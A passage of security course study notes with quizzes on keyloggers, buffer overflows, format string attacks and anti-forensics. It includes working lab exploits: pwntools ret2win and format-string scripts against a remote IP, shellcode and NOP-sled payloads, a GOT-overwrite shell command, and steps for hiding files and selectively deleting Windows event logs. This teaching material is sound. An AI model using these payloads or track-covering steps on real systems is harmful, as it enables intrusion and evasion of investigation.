* **Trojan Defenses:** Run updated antivirus with **weekly virus definition updates**, execute software only from trusted developers, verify **digital signatures and cryptographic hashes (digital fingerprints)**, and avoid untrusted single-purpose checkers.

---

### 3.3 Keyloggers

| Keylogger Type | Scope & Characteristics |
| :--- | :--- |
| **Application-Specific Keylogger** | Captures keystrokes **only within a specific target application** (e.g., an instant messaging client). |
| **System Keylogger** | Software module capturing **all keystrokes** across the entire operating system. |
| **Hardware Keylogger** | Physical device plugged inline between the keyboard cable and PC; **OS-independent**, **undetectable by antivirus software**, requires **physical access**. |

* **Keylogger Tools (MCQ):**
  * **Key Logger Pro:** Activated/unhidden with hotkey **`SHIFT + CTRL + ALT + K`**; saves logs to `.klg` files.
  * **Actual Key Logger:** Activated/unhidden with hotkey **`SHIFT + CTRL + ALT + F7`**; logs keystrokes and internet activity, exfiltrating data via **Email, LAN, or FTP**.

> [!question]- Practice Check: Module 3 (Maintaining Access)
> **1. (MCQ)** Which rootkit category leaves system utilities such as `ls`, `ps`, and `ifconfig` unmodified while intercepting API calls at the operating system core?
> * A) Application-Level Trojan
> * B) Traditional Rootkit
> * C) Kernel-Level Rootkit
> * D) Non-Promiscuous Sniffing Backdoor
>
> **2. (MSQ)** Which of the following are valid methods used to implement a **Kernel-Level Rootkit**? *(Select all that apply)*
> * A) Loading a malicious Loadable Kernel Module (LKM)
> * B) Replacing `/bin/ls` and `/bin/ps` with trojanized binaries
> * C) Patching the kernel image on the hard drive
> * D) Altering the kernel in memory on a running system
>
> **3. (Descriptive)** Contrast how a **non-promiscuous sniffing backdoor (`cd00r`)** activates compared to a standard Netcat bind shell, and explain why it is stealthier.
>
> ---
> **Answers:**
> 1. **C** (`Kernel-Level Rootkit`).
> 2. **A, C, D** (B describes a Traditional Rootkit).
> 3. A standard Netcat bind shell keeps a TCP/UDP port continuously open in a `LISTENING` state, making it easy to spot via `netstat` or port scans. `cd00r` passively sniffs incoming traffic without holding an open listening socket and only opens a temporary port (e.g., `5002`) after detecting a specific port-knocking sequence of TCP SYN packets ($X \rightarrow Y \rightarrow Z$).

---

## 4. Binary Exploitation (Buffer Overflows & Format String Attacks)

### 4.1 32-Bit x86 Process Memory Layout & Calling Conventions

Low-level languages like C/C++ do not enforce automatic array bounds checking (`char buf[4]; buf[4] = 'a';` writes out of bounds). Attackers exploit this to overwrite adjacent variables, saved base pointers (`%ebp`), or function return addresses (`%eip`).

```text
High Address: 0xffffffff (4 GB)
+-----------------------------------+
| Command-line args & Env variables | <-- Set when process starts
+-----------------------------------+
|               Stack               | <-- Local vars, saved %ebp, return addr (%eip)
|                 |                 |     Grows DOWNWARD toward lower addresses
|                 v                 |
|                                   |
|                 ^                 |
|                 |                 |
|               Heap                | <-- Dynamic memory (malloc), grows UPWARD
+-----------------------------------+
|     Uninitialized Data (BSS)      | <-- e.g., static int x; (known at compile time)
+-----------------------------------+
|         Initialized Data          | <-- e.g., static const int y = 10;
+-----------------------------------+
|            Text (Code)            | <-- Compiled machine instructions (read-only)
+-----------------------------------+
Low Address:  0x00000000
```

#### x86 Function Call & Return Lifecycle (Descriptive)
1. **Caller Setup:**
   * push arguments onto stack in reverse
   * push return address
   * jump to function address
1. **Callee Prologue:**
   * push old frame pointer (ebp) onto stack 
   * set current frame pointer to where the end of stack is
   * push local variables onto stack
1. **Callee Epilogue (Return):**
   * reset previous stack frame
   * jump back to return address

---

### 4.2 Buffer Overflow Exploitation Labs & Offset Math

> [!warning] Lab Prerequisite: Disabling ASLR
> Before practicing classic stack overflows, disable Address Space Layout Randomization (ASLR) so stack addresses remain predictable across runs:
> ```bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```

#### Walkthrough 1: Variable Overwrite & Segfault Offset Calculation (`example.c`)
Consider the local stack variables in `main()`:
```c
char world[8], hello[8];
char i;
char buf[8];
```
Because the stack grows downward, `buf[8]` sits at the **lowest** memory address, so overflowing `buf` writes **upward** into `i`, `hello`, `world`, `Saved EBP`, and `Return Address`:

| Stack Offset from `buf[0]` | Size | Variable / Frame Component | Notes |
| :--- | :--- | :--- | :--- |
| **Bytes 0 – 7** | 8 bytes | `char buf[8]` | Target buffer written by `strcpy(buf, argv[1])` |
| **Byte 8** | 1 byte | `char i` | Controls `if (i == '1')` branch |
| **Bytes 9 – 16** | 8 bytes | `char hello[8]` | Initialized to `"Hello\0"` |
| **Bytes 17 – 24** | 8 bytes | `char world[8]` | Initialized to `"World\0"` |
| **Bytes 25 – 28** | 4 bytes | `Saved EBP` | Caller frame pointer |
| **Bytes 29 – 32** | 4 bytes | `Return Address (EIP)` | Overwriting this triggers a **Segmentation Fault** |

* **Minimum Input Length for Segmentation Fault:** **29 characters** (the 29 characters fill bytes `0..28`, and `strcpy`'s automatic trailing null terminator `\0` overwrites byte `29` of the Return Address).
* **Crafting Input to Always Print `"Hackers from SIT"`:**
  * Input: `./example1 "111111111Hackers from SIT"`
  * **Byte 0–7:** `"11111111"` fills `buf[0..7]`.
  * **Byte 8:** `'1'` (the 9th `'1'`) overwrites `i`, forcing `if (i == '1')` to evaluate to **true** regardless of what the user typed at `scanf`.
  * **Byte 9–16:** `"Hackers "` fills all 8 bytes of `hello` with **no `\0` terminator**.
  * **Byte 17–24:** `"from SIT"` fills `world`, followed by `\0` at Byte 25. When `printf("%s\n", hello)` runs, it reads continuously across `hello` and `world` until hitting `\0` at byte 25, printing `Hackers from SIT`.

#### Walkthrough 2: Shellcode Injection with NOP Sled (`char buf[256]`)
* **Finding Offset:** In `gdb`, `run $(python -c "print('A'*272)")` crashes with a segfault $\rightarrow$ Return Address is located at bytes **268–271** (268 bytes before return address).
* **Payload Layout (272 bytes total):**
  ```text
  [ NOP Sled: \x90 * 222 ] + [ 46-byte /bin/sh Shellcode ] + [ 4-byte Return Addr (Little-Endian) ]
  ```
* **Why Use a NOP Sled (`0x90`)?** Stack addresses shift slightly between `gdb` (`0xbffff150`) and standalone terminal execution (`0xbffff1c0`). Pointing the return address anywhere inside the 222-byte `\x90` (NOP) sled causes the CPU to slide harmlessly down into the 46-byte shellcode.

#### Walkthrough 3: Remote `ret2win` Exploit with `pwntools`
* Target `vuln()` allocates `char buf[32]`, leaks `win()` address (`0x080491c6`), and calls unsafe `gets(buf)`.
* **Step 1 — Discover Exact Offset with Cyclic Pattern:**
  ```python
  from pwn import *
  io = remote('18.222.196.112', 4444)
  io.recvline(); io.recvline(); io.recvline()
  io.sendline(cyclic(100))     # Sends aaaabaaacaaadaaa...
  # Crash EIP reported as 0x6161616c -> cyclic_find(0x6161616c) == 44
  ```
* **Step 2 — Send Little-Endian Exploit Payload:**
  ```python
  from pwn import *
  offset = cyclic_find(0x6161616c)   # 44 bytes
  io = remote('18.222.196.112', 4444)
  payload = b'A' * offset + p32(0x080491c6)  # \xc6\x91\x04\x08 in little-endian
  io.recvline(); io.recvline(); io.recvline()
  io.sendline(payload)
  io.interactive()
  ```

> [!tip] Buffer Overflow Defenses (MSQ Checklist)
> * **Safe Functions:** Never use `gets()` or unbounded `strcpy()`; use bounds-checked `fgets()` or `strncpy()`.
> * **Stack Canaries (`-fstack-protector` / `-fstack-protector-all`):** Places a secret random value before the saved base pointer and return address; if a buffer overflow corrupts the canary, the program immediately aborts.
> * **ASLR + PIE (`-fpie -pie`):** Randomizes stack, heap, library, and code addresses on every execution so target addresses (like `win()` or shellcode) cannot be predicted.
> * **NX / DEP (Non-Executable Stack):** Marks stack memory pages as non-executable, preventing injected shellcode from running on the stack.

---

### 4.3 Format String Attacks

> [!important] Root Cause & Format Specifier Primitives
> A **Format String Vulnerability** occurs when user-controlled data is passed directly as the format string argument (`printf(user_input);`) instead of as a data argument (`printf("%s", user_input);`). `printf` expects arguments on the stack above its format string pointer and will read or write arbitrary stack slots if specifiers are supplied by the attacker.

| Specifier | Behavior in `printf` | Exploitation Primitive |
| :--- | :--- | :--- |
| **`%x`** | Reads the next 4-byte stack word as hexadecimal and advances one slot. | **Safe Stack Leak** (peeks at stack variables/addresses). |
| **`%p`** | Prints the next stack word formatted as a memory pointer (`0x...`). | **Address / Pointer Leak** (defeats ASLR if pointers are leaked). |
| **`%s`** | Treats the next stack word as a **memory address** and dereferences it to print a string. | **Arbitrary Memory Read** (crashes with segfault if the word is not a valid readable pointer). |
| **`%n`** | **Writes** the total number of characters printed so far by `printf` into the memory address pointed to by the next stack argument (`%hn` writes 2 bytes). | **Arbitrary Memory Write** (corrupts variables, flags, or GOT entries). |
| **`%N$s` / `%N$n`** | **Direct Parameter Access**; jumps directly to the $N$-th stack argument. | Avoids padding with dozens of `%08x` specifiers. |

#### Step-by-Step Format String Exploitation
1. **Locate Input Offset on Stack:**
   * Send probe: `AAAA.%08x.%08x.%08x.%08x.%08x`
   * Output: `AAAA.bffff308.b7fc7524.bffff338.00000001.41414141` $\rightarrow$ `0x41414141` (`AAAA`) sits at **stack slot 5**.
2. **Arbitrary Memory Read (`%s`):**
   * Replace `AAAA` with the little-endian target address (`0x0804a020` $\rightarrow$ `\x20\xa0\x04\x08`) and use direct parameter access `%5$s`:
   * Payload: `\x20\xa0\x04\x08%5$s` $\rightarrow$ Dereferences `0x0804a020` and prints `SUPER_SECRET_TOKEN_42`.
3. **Arbitrary Memory Write (`%n`):**
   * Overwrite `int auth_flag = 0` at `0x0804a050`:
   * Payload: `\x50\xa0\x04\x08.%08x.%08x.%08x.%08x.%n` $\rightarrow$ Prints 40 bytes total and writes `40` into `*(int*)0x0804a050`.
4. **Global Offset Table (GOT) Hijacking (`strdup` $\rightarrow$ `system`):**
   * In `example2.c`, `printf(b);` is immediately followed by `strdup(b);`.
   * Find `strdup@GOT` address via `objdump -R example2` (`0x0804a004`) and `system()` address in `gdb` (`0xb7e5f430`).
   * Split the 4-byte write into two 2-byte (`%hn`) writes to `0x0804a004` (lower 2 bytes: `0xf430` = `62512` chars) and `0x0804a006` (upper 2 bytes: `0xb7e5`):
   ```bash
   ./example2 $(python -c "print('sh;#\x04\xa0\x04\x08\x06\xa0\x04\x08-%62499x%4\$hn%50101x%5\$hn')")
   ```
   * When `strdup(b)` executes next, the GOT redirects execution to `system("sh;#...")`, spawning a shell.

### Lab 2: Format String Exploitation (`form.c`)

#### Vulnerable Target Program (`form.c`)

```c
#include <stdio.h>

void vuln(char buf[])
{
    char buf2[32];

    gets(buf2);
    printf(buf2);
}

int main()
{
    char buf[64];

    // flag_generator code is out of scope of this challenge.
    // It is a magic function that stores the random flag in the buffer.

    FILE * f = fopen("form_flag.txt", "r");

    if (f == NULL) {
        printf("Error . no flag\n");
        exit(0);
    }

    fgets(buf, 64, f);
    fflush(NULL);

    puts("Please enter your string: \n");

    vuln(buf);
}
```

> [!important] Root Cause & Stack Mechanics
> 1. **Flag Pointer on the Stack:** `main()` reads the secret flag from `form_flag.txt` into `buf[64]` and passes a pointer to `buf` as an argument when calling `vuln(buf)`.
> 2. **Format String Vulnerability:** `vuln()` reads user input into `buf2[32]` via `gets(buf2)` (also a buffer overflow risk) and passes `buf2` directly as the format string argument to `printf(buf2)`.
> 3. **Arbitrary Pointer Dereference (`%N$s`):** Although `vuln()` never prints `buf` directly, the pointer to the flag sits on the stack frame. Using **Direct Parameter Access** (`%N$s`), an attacker can instruct `printf` to treat that specific stack slot as a `char *` pointer and print the string stored at its target address.

---

#### Format Specifier Reference

| Specifier | Behavior on Stack | Risk / Reliability |
| :--- | :--- | :--- |
| **`%x`** | Reads the next stack word as an unsigned **hexadecimal** value and advances one slot | **Safe** — peeks at stack contents without dereferencing pointers |
| **`%p`** | Prints the next stack word formatted as a **memory pointer** (`0x...`) | **Safe** — ideal for identifying valid stack/heap addresses |
| **`%s`** | Treats the next stack word as a **memory address** and prints the null-terminated string located there | **Crash-prone** — causes a segmentation fault if the stack value is not a valid readable pointer |
| **`%n`** | Writes the total **number of bytes printed so far** into the memory address pointed to by the stack word | **Write primitive** — corrupts memory or crashes if the slot is not a valid writable address |

---

#### Step-by-Step Exploitation Walkthrough

1. **Initial Connection & Stack Peeking (`nc`):**
   Connect to the remote service (`nc 18.222.196.112 3333`) and send `%x` to verify format string evaluation (returns a hexadecimal stack word).
2. **Locate Candidate Stack Addresses:**
   Send a safe `%x` probe chain to inspect the first 9 stack words without crashing the binary:
   ```text
   %x.%x.%x.%x.%x.%x.%x.%x.%x.
   ```
   **Observed Output:**
   ```text
   f14a58a4.5f16e1a0.5d7b9209.1b.f14a6d40.ffe74ac8.ffe74aec.f14a6d40.5d7ba028.
   ```
   * **Words 6 (`ffe74ac8`) and 7 (`ffe74aec`)** match stack memory address ranges (`0xffe7...`).
3. **Dereference Target Slots with Direct Parameter Access:**
   * Send **`%6$s`** $\rightarrow$ dereferences slot 6 (`0xffe74ac8`), echoing your own input (`buf2`) back to you.
   * Send **`%7$s`** $\rightarrow$ dereferences slot 7 (`0xffe74aec`), following the `buf` argument pointer from `main()` and **printing the flag**.

> [!warning] Why You Cannot Spam `%s.%s.%s...`
> Each `%s` forces `printf` to dereference the corresponding 4-byte stack word as a memory pointer. Because early stack slots contain non-pointer integers (such as `0x1b`), spamming `%s` immediately triggers a **segmentation fault** and terminates the remote connection. Always map offsets with `%x`/`%p` first, or test `%N$s` across isolated connections.

---

#### Automating Offset Discovery with `pwntools`

```python
from pwn import *

for i in range(1, 10):
    print('*********************************')
    print(i)
    print('*********************************')
    io = remote('18.222.196.112', 3333)
    io.sendline(f"%{i}$s".encode())
    print(io.recvrepeat(0.5))
    io.close()
```

* **Fresh Connections per Probe:** Opening a new `remote()` socket on every loop iteration (`1` through `9`) ensures that when an invalid pointer slot (like `%1$s` or `%4$s`) crashes the remote process, the script continues cleanly until **`i = 7` (`%7$s`)** leaks the flag.

---

#### Defenses & Hardening

> [!tip] Format String Defenses (MSQ Checklist)
> * **Hardcode Format Strings:** Always write `printf("%s", user_input);` instead of `printf(user_input);`.
> * **Compiler Security Flags:** Compile with **`-Wformat -Wformat-security`** so the compiler flags non-literal format strings as errors.
> * **FORTIFY_SOURCE (`-D_FORTIFY_SOURCE=2`):** Adds runtime checks that block `%n` writes from writable format strings.
> * **Safe Input Functions:** Replace `gets()` with `fgets()`.

> [!question]- Practice Check: Module 4 (Binary Exploitation)
> **1. (MCQ)** Which format string specifier **writes** the count of characters printed so far into a memory address on the stack?
> * A) `%x`
> * B) `%p`
> * C) `%s`
> * D) `%n`
>
> **2. (MSQ)** Which compiler flags and OS mechanisms defend against **stack-based buffer overflows**? *(Select all that apply)*
> * A) `-fstack-protector-all` (Stack Canaries)
> * B) `-fpie -pie` combined with ASLR
> * C) NX / DEP (Non-Executable Stack)
> * D) `-D_FORTIFY_SOURCE=2` blocking `%n`
>
> **3. (Descriptive)** In a 32-bit C function containing `char world[8], hello[8]; char i; char buf[8];`, why does `strcpy(buf, argv[1])` require a minimum input of **29 characters** to cause a segmentation fault?
>
> ---
> **Answers:**
> 1. **D** (`%n`; `%hn` writes 2 bytes).
> 2. **A, B, C** (D specifically mitigates format string `%n` attacks).
> 3. Because the stack grows downward, `buf[8]` sits below `i` (1 byte), `hello[8]` (8 bytes), `world[8]` (8 bytes), and `Saved EBP` (4 bytes)—totaling $8 + 1 + 8 + 8 + 4 = 29$ bytes before the 4-byte Return Address (`EIP`). Writing 29 characters fills bytes `0..28`, and `strcpy`'s automatic trailing `\0` byte overwrites the first byte of the Return Address at offset 29, corrupting `EIP` on return.

---

## 5. Covering Tracks & Advanced Persistent Threats (APTs)

### 5.1 Covering Tracks & Anti-Forensics

After compromising a target and installing persistent backdoors, attackers remove forensic artifacts and conceal malicious files.

#### 1. Hiding Files, Folders & Steganography
* **Windows File Attributes:** Hide files/folders via Explorer properties or CLI:
  ```cmd
  attrib +s +a +h <folder_or_filename>
  ```
  *(Sets **S**ystem, **A**rchive, and **H**idden attributes).*
* **Folder Hiding Utilities:** **Free Hide Folder** and **My Lockbox** (both selectively hide folders, but **do not support hiding individual files**).
* **Steganography Tools:**
  * **QuickStego:** Hides text, usernames, passwords, and passphrases inside an image file.
  * **Xiao Steganography:** Hides full system files and executables inside an image file.

> [!important] Least Significant Bit (LSB) Steganography Capacity Math (MCQ)
> Each pixel in an uncompressed RGB image contains **3 color channels** (Red, Green, Blue), each stored as an 8-bit byte:
> * Modifying the **1st LSB (bit 0)** of each byte creates imperceptible color changes and yields a payload storage capacity of **$\frac{1}{8}$** ($12.5\%$) of the image's pixel data size.
> * Modifying the **2 lowest bits (bits 0 and 1)** increases storage capacity to **$\frac{2}{8}$** ($25\%$), but becomes visually noticeable in images containing large uniform color regions (such as clear skies or scenery).

#### 2. Creating Undeletable Files & Folders
* **Permission Denial:** Modify ACLs to explicitly **Deny** permissions for the user/group, then hide/rename the item.
* **Context Menu Disabling:** Disable right-click hotkeys/functions (copy, cut, paste, delete).
* **Inconspicuous Trailing Characters:** Append trailing spaces, dots, or underscores to filenames (e.g., `abcde.txt`, `abcde..txt`, `abcde_.txt`) that confuse standard Windows shell APIs.

#### 3. Windows Event Logs & System Cleanup
* **Windows Event Viewer Log Categories (MCQ):**

| Event Log Category | What It Records & Severity Levels |
| :--- | :--- |
| **Application** | Application-level events classified as **Error** (significant, e.g., data loss), **Warning** (potential future issue), or **Information** (successful operation). |
| **Security** | **Audit** events recorded as **Audit Success** or **Audit Failure** (e.g., user logon attempts). |
| **Setup** | Application/OS installation events; **Domain Controllers** display additional directory-service logs here. |
| **System** | Events logged by Windows OS components and drivers (**Error, Warning, Information**). |
| **Forwarded Events** | Events forwarded to the local machine from remote systems. |

* **Selective Log Editing:** Clearing an entire Security log generates an alertable event; attackers use **Winzapper** (requires an **Administrator** account) to **selectively delete** individual incriminating event records.
* **Endpoint Cleanup:** Clear browser history, temporary internet files, cookies, and recent document lists (using password-protected cleanup utilities scheduled at startup or intervals).

---